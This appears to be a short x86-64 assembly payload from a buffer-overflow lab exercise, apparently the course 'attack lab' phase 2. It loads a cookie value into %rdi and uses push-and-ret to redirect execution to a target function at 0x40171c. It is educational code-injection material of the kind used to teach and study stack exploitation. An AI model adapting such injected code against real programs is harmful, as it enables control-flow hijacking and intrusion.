movq $0x59b997fa, %rdi      # Push cookie.txt(0x59b997fa) to rdi
pushq $0x40171c             # Push phase_2(0x40171c) to stack
ret                         # Return to phase_2